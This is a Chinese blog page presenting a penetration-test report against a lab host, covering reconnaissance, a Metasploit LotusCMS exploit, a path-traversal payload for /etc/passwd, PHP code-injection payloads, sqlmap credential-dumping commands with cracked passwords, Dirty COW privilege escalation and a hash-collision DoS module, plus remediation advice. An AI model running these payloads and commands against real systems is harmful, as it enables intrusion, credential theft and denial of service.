@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    渗透测试报告总结 |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/technology.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-stzj" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      渗透测试报告总结
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/07/01/stzj/" class="article-date">
+  <time datetime="2019-07-01T07:05:18.000Z" itemprop="datePublished">2019-07-01</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/流量分析/">流量分析</a>
+  </div>
+
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <hr>
+<h1 id="渗透测试报告总结"><a href="#渗透测试报告总结" class="headerlink" title="渗透测试报告总结"></a>渗透测试报告总结</h1><p>目录<br>1.测试目的<br>2.渗透范围和测试主要内容<br>3.信息收集<br>4.渗透测试过程<br>4.1.目录测试<br>4.2.内容披露测试<br>4.3.弱口令测试<br>5.漏洞总结</p>
+<ol>
+<li>测试目的<br>通过实施针对性渗透，找出漏洞隐患，制定相应的安全措施与解决方案保障系<br>统的安全运行<br>&emsp;</li>
+<li>渗透范围和测试主要内容<br>测试主机：192.168.199.171<br>测试时间：2019.7.22<br>测试说明：通过漏洞扫描和手动分析获取相关数据<br>渗透方式：内网渗透<br>此次渗透主要包括对象：真的所有的安全隐患和漏洞，<br>通过端口，目录等进用弱口令,内容披露，msf模块利用等几个方面进行渗透测试。<br>&emsp;<br>&emsp;</li>
+<li>信息收集<br>此阶段中，渗透测试小组进行必要的信息收集，如 IP地址,软件版本信息，端口，等<br>渗透工具：御剑 。  AppScan       AWVS</li>
+<li>1.端口收集<br>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suho  </li>
+<li>2.版本信息收集<br>Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch Server at 192.168.199.171 Port 80</li>
+<li>3.通过AppScan和御剑目录收集<br><a href="https://imgchr.com/i/mAD9tf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAD9tf.png" alt="mAD9tf.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mADVns" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADVns.png" alt="mADVns.png"></a><br>&emsp;</li>
+<li>渗透测试过程<br>此阶段中，渗透测试根据第一阶段获取的信息对网络、系统进行渗透测试。</li>
+<li>1通过扫描的目录进行访问排查，找出可利用的目录： <a href="http://192.168.199.171/index.php" target="_blank" rel="noopener">http://192.168.199.171/index.php</a>?<br>访问出现以下后台登录界面，看标记的应该是名字之类的，可以搜一下看看有没有漏洞，我在<br>kali上调用模块试一下。<br><a href="https://imgchr.com/i/mADl3F" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADl3F.png" alt="mADl3F.png"></a><br>先查看有什么模块<br><a href="https://imgchr.com/i/mADYH1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADYH1.png" alt="mADYH1.png"></a><br>就一个模块，调用一下试试<br><a href="https://imgchr.com/i/mAD03D" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAD03D.png" alt="mAD03D.png"></a><br>添加受攻击IP，修改uri的为 /<br><a href="https://imgchr.com/i/mADsud" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADsud.png" alt="mADsud.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mAD5vQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAD5vQ.png" alt="mAD5vQ.png"></a><br>运行真的进去了，这算是一个高危漏洞了。<br><a href="https://imgchr.com/i/mArV2D" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mArV2D.png" alt="mArV2D.png"></a></li>
+<li>2.通过上网查看发现同样是这个还有一个文件披露漏洞，通过截断可以访问password。<br>访问网页<a href="http://192.168.199.171/index.php，可以看出后面加上截断，密码已经爆露出来了。" target="_blank" rel="noopener">http://192.168.199.171/index.php，可以看出后面加上截断，密码已经爆露出来了。</a><br><a href="http://192.168.199.171/index.php?system=../../../../../../../../etc/passwd%00" target="_blank" rel="noopener">http://192.168.199.171/index.php?system=../../../../../../../../etc/passwd%00</a>;<br><a href="https://imgchr.com/i/mArGRS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mArGRS.png" alt="mArGRS.png"></a><br>&emsp;</li>
+<li>3.PHP代码注入，通过AWVS扫出的高危漏洞。<br><a href="https://imgchr.com/i/mAryzF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAryzF.png" alt="mAryzF.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mArhIx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mArhIx.png" alt="mArhIx.png"></a><br>点击home，从AWVS中可以看到利用的POC<br><a href="http://192.168.199.171/index.php?page=${@print(md5(acunetix_wvs_security_test))}\" target="_blank" rel="noopener">http://192.168.199.171/index.php?page=${@print(md5(acunetix_wvs_security_test))}\</a><br>&emsp;<br><a href="https://imgchr.com/i/mArIJK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mArIJK.png" alt="mArIJK.png"></a><br>发现下面那段是用md5进行编码的，md5值对应的是63c19a6da79816b21429e5bb262daed8<br>这里使用md5解密工具进行解密，<a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a><br>解密出内容为：acunetix_wvs_security_test<br>也可通过此方法来写system((ls))<br><a href="http://192.168.199.171/index.php?page=${@print(system(ls))}\" target="_blank" rel="noopener">http://192.168.199.171/index.php?page=${@print(system(ls))}\</a><br>&emsp;<br><a href="https://imgchr.com/i/mArHQe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mArHQe.png" alt="mArHQe.png"></a><br>同样也可以使用phpinfo()这个函数<br><a href="http://192.168.199.171/index.php?page=${@print(phpinfo())}\" target="_blank" rel="noopener">http://192.168.199.171/index.php?page=${@print(phpinfo())}\</a><br>&emsp;<br><a href="https://imgchr.com/i/mArxFP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mArxFP.png" alt="mArxFP.png"></a><br>&emsp;</li>
+<li>4.测试<a href="http://192.168.199.239/phpmyadmin，访问出现phpmyadmin页面，经过测试发现该登录" target="_blank" rel="noopener">http://192.168.199.239/phpmyadmin，访问出现phpmyadmin页面，经过测试发现该登录</a><br>页面有弱口令漏洞，那么通过弱口令进入。<br><a href="https://imgchr.com/i/mAsZF0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAsZF0.png" alt="mAsZF0.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mAs8T1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAs8T1.png" alt="mAs8T1.png"></a><br>&emsp;<br>&emsp;</li>
+<li>5手工注入<a href="http://192.168.199.239/gallery/" target="_blank" rel="noopener">http://192.168.199.239/gallery/</a>    ，发现图片不显示，是因为hstos文件没有配置在本地虚拟机<br>/etc/hstos里面添加。<br><a href="https://imgchr.com/i/mAsUSO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAsUSO.png" alt="mAsUSO.png"></a><br>点击标记区域进入，在？后面添加or 1=1 页面发生了变化，说明可能有sql注入漏洞。<br><a href="https://imgchr.com/i/mAs2p8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAs2p8.png" alt="mAs2p8.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mAsHhV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAsHhV.png" alt="mAsHhV.png"></a><br>然后使用sqlmap进行跑这个可能存在的注入点<br>使用kali中的sqlmap，<br>sqlmap -u “<a href="http://192.168.199.171/gallery/gallery.php?id=1^&amp;sort=photoid&quot;" target="_blank" rel="noopener">http://192.168.199.171/gallery/gallery.php?id=1^&amp;sort=photoid&quot;</a> –dbs –cookie=”gallarific_vote_3=1; gallarific_vote_5=1; gallarific_vote_4=1; PHPSESSID=24f177e5cfc63063750f1eeef9362c54”<br><a href="https://imgchr.com/i/mAsvnJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAsvnJ.png" alt="mAsvnJ.png"></a><br>爆出三个数据库，分别是：gallery、information_schema、mysql<br>sqlmap -u “<a href="http://192.168.199.171/gallery/gallery.php?id=1^&amp;sort=photoid&quot;" target="_blank" rel="noopener">http://192.168.199.171/gallery/gallery.php?id=1^&amp;sort=photoid&quot;</a> -D gallery -T gallarific_users -C username,password –dump –cookie=”gallarific_vote_3=1; gallarific_vote_5=1; gallarific_vote_4=1; PHPSESSID=24f177e5cfc63063750f1eeef9362c54”<br><a href="https://imgchr.com/i/mAyAje" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAyAje.png" alt="mAyAje.png"></a><br>获取到gallery这个数据库中有username和password这两个表。<br>sqlmap -u “<a href="http://192.168.199.171/gallery/gallery.php?id=1^&amp;sort=photoid&quot;" target="_blank" rel="noopener">http://192.168.199.171/gallery/gallery.php?id=1^&amp;sort=photoid&quot;</a> -D mysql -T user -C User,Password –dump –cookie=”gallarific_vote_3=1; gallarific_vote_5=1; gallarific_vote_4=1; PHPSESSID=24f177e5cfc63063750f1eeef9362c54”<br><a href="https://imgchr.com/i/mAyl38" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAyl38.png" alt="mAyl38.png"></a><br>查看到mysql数据库中的user和password<br>使用md5进行解密<br><a href="https://imgchr.com/i/mA6SKg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA6SKg.png" alt="mA6SKg.png"></a><br>解密出root用户对应的密码是fuckeyou<br>然后使用burpsuite进行sqlmap,使用burp拦截以下页面<br><a href="https://imgchr.com/i/mA6EGV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA6EGV.png" alt="mA6EGV.png"></a><br>使用burp发送到sqlmap中，使用CO2进行sqlmap中选择如下图所示。<br><a href="https://imgchr.com/i/mA6QaR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA6QaR.png" alt="mA6QaR.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mA6dZd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA6dZd.png" alt="mA6dZd.png"></a><br>成功爆出账号名和密码<br>账号和密码分别是：<br>dreg Mast3r<br>loneferret starwars<br>&emsp;<br>使用脏牛进行提权<br>在3.6中获取了两个普通的账号和密码<br>ssh进行登陆<br><a href="https://imgchr.com/i/mA6cQS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA6cQS.png" alt="mA6cQS.png"></a><br>下载脏牛，放到/home/loneferret<br><a href="https://imgchr.com/i/mA6hon" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA6hon.png" alt="mA6hon.png"></a><br>使用gcc -pthread dirty.c -o dirty -lcrypt命令对dirty.c进行编译，生成一个dirty的可执行文件。<br>执行 ./dirty ，即进行提权，并写入新的密码<br><a href="https://imgchr.com/i/mA6OeJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA6OeJ.png" alt="mA6OeJ.png"></a><br>&emsp;<br>&emsp;</li>
+<li>6.PHP Hash Collision denial of service DDoS攻击</li>
+<li>查看模块<br>search CVE-2011-4885</li>
+<li>使用模块<br>use auxiliary/dos/http/hashcollision_dos<br>添加攻击目标IP<br>set rhosts 192.168.199.171<br>set target PHP<br>run<br><a href="https://imgchr.com/i/mAciOe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAciOe.png" alt="mAciOe.png"></a><br>&emsp;</li>
+<li>测试结果分析</li>
+<li>PHP代码注入漏洞<br>风险等级： 中<br>漏洞描述：用户可以通过PHP代码注入，对网站进行命令执行，获取一些信息<br>漏洞位置： <a href="http://192.168.199.171/index.php" target="_blank" rel="noopener">http://192.168.199.171/index.php</a><br>整改建议：<br>1、对一些重要命令进行限制<br>2、对相关字段进行过滤<br>2。文件包含漏洞<br>风险等级： 中<br>漏洞描述：用户可以通过使用文件包含的方法,包出网站的发布目录以及重要路径<br>漏洞位置： <a href="http://192.168.199.171/index.php?system=Blog" target="_blank" rel="noopener">http://192.168.199.171/index.php?system=Blog</a><br>整改建议：<br>1.关闭allow_url_fopen allow_url_include<br>2.进行验证</li>
+</ol>
+<p>3.LotusCMS后台管理漏洞<br>风险等级： 高<br>漏洞描述：通过该漏洞,可以获取shell并提权获得系统的最高权限<br>漏洞位置： <a href="http://192.168.199.171/style/comps/admin/login.phtml" target="_blank" rel="noopener">http://192.168.199.171/style/comps/admin/login.phtml</a><br>整改建议：<br> 更换一个新版本的更安全的</p>
+<p>4.phpmyadmin弱口令漏洞<br>风险等级：中<br>漏洞描述：随便输入用户名,密码为空,既能进入<br>漏洞位置：<a href="http://192.168.199.171/style/comps/admin/login.phtml" target="_blank" rel="noopener">http://192.168.199.171/style/comps/admin/login.phtml</a><br>整改建议：<br> 更换一个新版本的更安全的<br>5.PHP Hash Collision denial of service DDoS攻击<br>风险等级： 高<br>漏洞描述：通过DDoS攻击,直接导致服务器死机<br>漏洞位置：<a href="http://192.168.199.171" target="_blank" rel="noopener">http://192.168.199.171</a><br>整改建议：<br>  控制POST数据的数量<br>  在Web服务器层面进行处理，例如限制http请求body的大小和参数的数量等，这个是现在用的最多的临时处理方案</p>
+<p>6.SQL注入漏洞<br>风险等级： 高<br>漏洞描述：借助sqlmap等工具,可以轻松的获取<br>漏洞位置： <a href="http://192.168.199.171/phpmyadmin" target="_blank" rel="noopener">http://192.168.199.171/phpmyadmin</a><br>整改建议：<br> 设置安全的用户密码<br> 设置验证码辅助验证</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/01/stzj/" data-id="cjzc42543001ddkv6pug6uapm"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试报告总结/">渗透测试报告总结</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/06/28/centos7-dhcp/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">centos7中安装dhcp服务</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/technology.js"></script>
+
+  </div>
+</body>
+</html>
